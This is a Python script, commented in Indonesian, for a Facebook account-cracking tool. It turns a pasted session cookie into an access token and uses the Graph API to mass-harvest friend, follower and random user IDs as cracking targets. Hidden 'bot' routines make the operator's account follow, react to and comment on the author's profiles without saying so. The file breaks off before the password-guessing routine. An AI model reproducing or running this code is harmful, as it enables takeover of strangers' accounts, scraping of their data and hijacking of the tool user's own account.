#!/usr/bin/python3
# -*- coding: utf-8 -*-
# kalau lu recode data hp lu yang hilang!!
Author    = 'Fikri Syahputra Sinaga'
Facebook = 'Facebook.com/fikri sinaga'
Instragram = 'Instragram.com/fikri.sinaga'
LicenseKey = '06 Hari'
Version = 'V.11'
Fikri  = 100080716718035
Postingan = 105432708823953

### IMPORT MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
##### BUAT WARNA >>>> X
Z = "\x1b[0;90m"     # Hitam
M2 = "\x1b[38;5;196m" # Merah
H2 = "\x1b[38;5;46m"  # Hijau
K2 = "\x1b[38;5;226m" # Kuning
B2 = "\x1b[38;5;44m"  # Biru
I = "\x1b[1;96m"     # Biru Muda
P2 = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### User Agent
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

### Akun Author Jangan Diganti Nanti Error !!!
_my_account_ = [
    '100004623370585','100000415317575','100000737201966','100020766075165','100000431996038','100026818103201','100001617352620',
    '100000729074466','607801156','100009340646547','1676993425','1767051257','100000287398094','100001085079906',
    '100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189']
    
##### BUAT IMPORT YG BELUM INSTALL AHAHHAA
try:
	import requests
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module futures belum terinstall")
	os.system("pip install futures")
### BAGIAN LOGO ###
def banner():
  os.system("clear")
  print("""%s\x1b[1;93m______   \x1b[1;92m_______  \x1b[1;94m______    \x1b[1;91m___   _\n \x1b[1;93m|      | \x1b[1;92m|   _   |\x1b[1;94m|    _ |  \x1b[1;91m|   | | |\n \x1b[1;93m|  _    |\x1b[1;92m|  |_|  |\x1b[1;94m|   | ||  \x1b[1;91m|   |_| |\n \x1b[1;93m| | |   |\x1b[1;92m|       |\x1b[1;94m|   |_||_ \x1b[1;91m|      _|\n \x1b[1;93m| |_|   |\x1b[1;92m|       |\x1b[1;94m|    __  |\x1b[1;91m|     |_ \n \x1b[1;93m|       |\x1b[1;92m|   _   |\x1b[1;94m|   |  | |\x1b[1;91m|    _  |\n \x1b[1;93m|______| \x1b[1;92m|__| |__|\x1b[1;94m|___|  |_|\x1b[1;91m|___| |_| \x1b[1;96mFB\n\n \x1b[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n ✫╬─\x1b[1;92mYang Punya SC \x1b[1;91m: \x1b[1;93mGanteng Bang \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mFB \x1b[1;92m \x1b[1;91m: \x1b[1;96mFacebook.com/fikri.sinaga \x1b[1;95m─╬✫\n ✫╬─\x1b[1;92mGitHub \x1b[1;91m: \x1b[1;94mGithub.com/Syafii-XD \x1b[1;95m─╬✫\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""%(N))


###----------[ TIME ]---------- ###
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

### Host & Penampungan
IP = requests.get('https://api.ipify.org').text
host = "https://mbasic.facebook.com"
##### BUAT STR /LEN
id = []
ok = []
cp = []
loop=0

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.04)
### BUAT ANIMASI JALAN
def mlaku(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for i in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(i):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + i['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('cookie.txt','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:
      return(username)
    
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('%s╠══[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %sTidak Dapat Mengeksekusi %s'%(M,A,M,A,M))
    print('%s╠══[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %sCookies/Token Invalid'%(M,A,M,A))
    print('%s╠══[%s•%s] %sSalah Memasukkan ID'%(M,A,M,A))
    print('%s╠══[%s•%s] %sBug Pada Source Code'%(M,A,M,A))
    print('%s╠══[%s•%s] %sBug Pada Requests'%(M,A,M,A))
    print('%s╠══[%s•%s] %sDan Lain-Lain'%(M,A,M,A))
    print('%s╠══[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %spython premium.py\n'%(M,A,M,A))
    exit()
    
###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Fikri)];self.komen = ['Abg Sayang🥰','Abg fikri Udh Punya Pacar😘','Kenalan Yuk Bang😁','Soalnya Sc Abg Keren😘😘']
        for i in list_id: self.get_folls(i,cookie); self.get_likers(f'https://mbasic.facebook.com/{i}?v=timeline',cookie); self.get_posts(i,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                    for i in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in i['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(i['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for i in bos.find_all('a',href=True):
                        if 'Tanggapi' in i.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(i['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for i in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+i['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(i['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('cookie.txt','w').write(self.cookie_mentah);open('token.txt','w').write(token);exit(bot_follow(cookie))
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))
        
##### LOGIN COOKIE
def log_cookie():
    os.system('clear')
    defaultua()
    banner()
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sJangan Gunakan Akun Pribadi%s!%s!%s'%(M,P,M,P,M,P,M))
    print('%s║'%(B))
    cookie = str(input('%s╠══[%s•%s] %sMasukkan Cookie : %s'%(P,K,P,K,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('token.txt', 'w').write(token)
        open('cookie.txt','w').write(cookie)
        bot_follow(cookie)
    except KeyError:
      print("%s[!] Cookie kadaluwarsa!"%(M))
      sys.exit() 

### Bot Follow Jangan Diganti Anjink !
def bot_follow(cookie):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,cookie));time.sleep(0.3)
            except:pass
        print('%s║'%(B));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(K,P,K,P));time.sleep(2);menu()
    except:pass
    
    
###### BUAT MENU
def menu():
    global token,cookie
    os.system('clear')
    try:
        token = open('token.txt','r').read()
        cookie = {'cookie':open('cookie.txt','r').read()}
        language(cookie)
        get  = requests.get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
        jso=json.loads(get.text)
        nama =jso['name']
        _id_=jso['id']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] cookie kadaluwarsa!"%(M))
        os.system('rm -rf token.txt')
        os.system('rm -rf cookie.txt')
        log_cookie()
    except requests.exceptions.ConnectionError:
      exit(" %s[!] anda tidak terhubung ke internet!"%(M))
    banner()
    print("\x1b[1;92m╠══[\x1b[1;95m+\x1b[1;94m] \x1b[1;92m-------------------------------------------------------")
    print('\x1b[1;92m╠══[\x1b[1;95m•\x1b[1;92m] \x1b[1;94mAuthor     : \x1b[1;97mFikri Syahputra Sinaga \x1b[1;94mX \x1b[1;97mSyafii-XD')
    print('\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;97mVersion    : \x1b[1;92mV.11')
    print('\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mFacebook   : \x1b[1;92mfikri sinaga')
    print("\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
    print("\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s\x1b[1;92m"%(tanggal))
    print("\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;91mF R R E E%s"%(H,N))
    print("%s\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m08126949xxxx"%(N))
    print("\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
    print("\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
    jalan('%s╔══[ %sSelamat Datang %s %s]'%(K,P,nama,K))
    print('%s╠══[%s••%s] %sID : %s'%(K,P,K,P,_id_))
    print('%s╠══[%s••%s] %sIP : %s'%(K,P,K,P,IP))
    print('')
    print("\x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;97mCrack \x1b[1;97mID Teman Publik \x1b[1;92m[\x1b[1;93m50000 ID\x1b[1;92m]")
    print("\x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;97mCrack \x1b[1;97mID Teman Massal \x1b[1;92m[\x1b[1;93m50000 ID\x1b[1;92m]")
    print("\x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;97mCrack \x1b[1;97mID Followers \x1b[1;92m[\x1b[1;93m50000 ID\x1b[1;92m]")
    print("\x1b[1;92m╠══[\x1b[1;93m04\x1b[1;92m] \x1b[1;97mCrack \x1b[1;97mID Postingan \x1b[1;92m[\x1b[1;93m50000 ID\x1b[1;92m]")
    print("\x1b[1;92m╠══[\x1b[1;93m05\x1b[1;92m] \x1b[1;97mCrack Random \x1b[1;97mID FB New \x1b[1;92m[\x1b[1;93m50000 ID\x1b[1;92m]")
    print("\x1b[1;92m╠══[\x1b[1;93m06\x1b[1;92m] \x1b[1;97mSettings \x1b[1;97mUser Agent \x1b[1;94mU\x1b[1;97m/\x1b[1;95mA")
    print("\x1b[1;92m╠══[\x1b[1;93m07\x1b[1;92m] \x1b[1;97mCheck \x1b[1;97mHasil Crack")
    print("\x1b[1;92m╠══[\x1b[1;93m08\x1b[1;92m] \x1b[1;97mCheck \x1b[1;97mOpsi CheckPoint")
    print("\x1b[1;92m╠══[\x1b[1;93m09\x1b[1;92m] \x1b[1;97mLaporkan \x1b[1;97mBug Script")
    print("\x1b[1;92m╠══[\x1b[1;93m10\x1b[1;92m] \x1b[1;97mInfo \x1b[1;97mTools/Script")
    print("\x1b[1;92m╠══[\x1b[1;93m11\x1b[1;92m] \x1b[1;97mCrack \x1b[1;97mDari Pertemanan Sendiri")
    print("\x1b[1;92m╠══[%s\x1b[1;93m00%s\x1b[1;92m]\x1b[1;92m \x1b[1;91mHapus cookie"%(M,N))
    print('%s\x1b[1;92m║'%(B))
    asw = input('%s╠══[%s••%s] %sPilih : '%(K,P,K,P))
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "2":
    	massal()
    elif asw == "3":
    	followerss()
    elif asw == "4":
    	postingan()
    elif asw == "5":
    	fbbaru()
    elif asw == "6":
    	ugen()
    elif asw == "7":
      cek_hasil()
    elif asw == "8":
      cek_results()
    elif asw == "9":
      laporbug()
    elif asw == "10":
      info_tools()
    elif asw == "11":
      listteman()
    elif asw == "0":
      os.system('rm -rf token.txt')
      os.system('rm -rf cookie.txt')
      exit()
    else:
      jalan(" ╠══[!] pilih jawaban dengan bener ! ")
      menu() 
      
##### CRACK PUBLIK
def publik():
    try:
        token = open('token.txt','r').read()
        cookie = {'cookie':open('cookie.txt','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sKetik/Me/Untuk Dump ID Publik'%(K,P,K,P))
    _id_=input(f"{K}╠══[•] {P}Masukan user id : {B}")
    try:
        url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            jalan(f"{K}╠══[•] {U}Maaf User ID Tidak Bersifat Publik");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)} {K}ID")
        fii_xd()
    else:print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)}{A}ID")
    
def massal():
    try:
        token = open('token.txt','r').read()
        cookie = {'cookie':open('cookie.txt','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    try:
        print('%s║'%(B))
        print('%s╠══[%s•%s] %sMasukkan Berapa ID Yang Ingin Di crack'%(K,P,K,P))
        print('%s║'%(B))
        tanya_total = int(input("%s╠══[%s•%s] %sMasukkam Jumlah ID : "%(K,P,K,P)))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        print('%s║'%(B))
        _id_=input(f"%s╠══[%s•%s] %sMasukkan User ID {P}{t}  : {B}"%(K,P,K,P))
        try:
            url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
            z=json.loads(url.text)
            for i in z['friends']['data']:
                uid = i["id"]
                nama = i["name"]
                id.append(uid+"<=>"+nama)
        except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            print(f"{K}╠══[•] {U}User id tidak di temukan");menu()
    if len(id) == 0:
       print('%s║'%(B))
       print(f"{K}╠══[•]{M} Maaf total id anda adalah {B}{len(id)}");exit()
    else:
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)}{A}ID")
        fii_xd()
        
        
##### CRACK PERTEMANAN 
def listteman():
    try:
        token = open('token.txt','r').read()
        cookie = {'cookie':open('cookie.txt','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    try:
        url = requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            jalan(f"{K}╠══[•] {U}User id tidak di temukan");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)} {K}ID")
        fii_xd()
    else:print(f"{K}╠══[•]{M} Maaf total id : {B}{len(id)}");exit()
        
###### CRACK FOLLOWERS
def followerss():
    try:
        token = open('token.txt','r').read()
        cookie = {'cookie':open('cookie.txt','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    print('%s║'%(B))
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sKetik/Me/Untuk Dump ID Publik'%(K,P,K,P))
    _id_=input(f"{K}╠══[•] {P}Masukan user id : {B}")
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            jalan(f"{K}╠══[•] {U}Maaf User ID Tidak Bersifat Publik");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)} {K}ID")
        fii_xd()
    else:print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)}{A}ID")

##### PENGGANTI USER - UA
### User Agent Bawaan
def defaultua():
    ua = ua_xiaomi
    try:ua = open('ugent.txt','w').write(ua)
    except (KeyError,IOError):log_cookie()
    
### Menu User Agent
def ugen():
    print("%s╠══[%s1%s] %sDapatkan User Agent"%(K,P,K,P))
    print("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(K,P,K,P,K,P,K))
    print("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(K,P,K,P,K,P,K))
    print("%s╠══[%s4%s] %sHapus User Agent"%(K,P,K,P))
    print("%s╠══[%s5%s] %sCek User Agent"%(K,P,K,P))
    print("%s╠══[%s0%s] %sKembali"%(K,P,K,P))
    pmu = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
    print('%s║'%(B))
    if pmu in[""]:
      jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:
      os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
      input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(K,P,K,P))
        try:
          ua = open('ugent.txt','w').write(ua)
          jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(K,P,K))
          print('%s║'%(B))
          input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
        except (KeyError,IOError):
          jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M))
          print('%s║'%(M))
          input('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:
      os.system("rm -rf ugent.txt")
      jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(M,P,M))
      print('%s║'%(B))
      input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['5','05','005','e']:
        try:
          ua = open('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'Tidak Ditemukan'
        print("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(K,P,K,P,K,ua))
        jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(K,P,K))
        print('%s║'%(B))
        input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['0','00','000','f']:
      menu()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s╠══[%s1%s] %sXiaomi'%(K,P,K,P))
    print('%s╠══[%s2%s] %sNokia'%(K,P,K,P))
    print('%s╠══[%s3%s] %sAsus'%(K,P,K,P))
    print('%s╠══[%s4%s] %sHuawei'%(K,P,K,P))
    print('%s╠══[%s5%s] %sVivo'%(K,P,K,P))
    print('%s╠══[%s6%s] %sOppo'%(K,P,K,P))
    print('%s╠══[%s7%s] %sSamsung'%(K,P,K,P))
    print('%s╠══[%s8%s] %sWindows'%(K,P,K,P))
    pc = input('%s╠══[%s•%s] %sPilih : '%(J,P,J,P))
    print('%s║'%(B))
    if pc in['']:
      jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pc in ['1','01']:ua = open('ugent.txt','w').write(ua_xiaomi)
    elif pc in ['2','02']:ua = open('ugent.txt','w').write(ua_nokia)
    elif pc in ['3','03']:ua = open('ugent.txt','w').write(ua_asus)
    elif pc in ['4','04']:ua = open('ugent.txt','w').write(ua_huawei)
    elif pc in ['5','05']:ua = open('ugent.txt','w').write(ua_vivo)
    elif pc in ['6','06']:ua = open('ugent.txt','w').write(ua_oppo)
    elif pc in ['7','07']:ua = open('ugent.txt','w').write(ua_samsung)
    elif pc in ['8','08']:ua = open('ugent.txt','w').write(ua_windows)
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(J,P,J))
    print('%s║'%(B))
    input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    
### DUMP POSTINGAN ###
def postingan():
	global token, cookie
	try:
		token = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
	except IOError:
		exit(" ╠══[!] cookie kadaluwarsa")
	idt = raw_input(" ╠══[?] masukan url atau id postingan : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s?fields=friends.limit=50000&access_token=%s"%(idt, token),cookies=cookie).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ╠══[!] postingan tidak tersedia atau post private")
		print('%s \x1b[1;92m║'%(B))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	fii_xd()
	
### DUMP NEW FB ###
def fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "1000" 
	limit = int(input(" ╠══[+] masukan jumlah id Maksimal 50000 id: "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
